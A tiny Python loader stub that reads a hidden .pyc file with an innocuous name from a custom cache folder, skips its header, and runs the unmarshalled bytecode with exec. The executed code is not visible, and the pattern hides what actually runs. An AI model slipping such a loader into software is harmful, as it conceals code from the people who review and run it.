
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'internet_connection_exception_0005a3b25e9a42738d9ac4a4c4408232.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
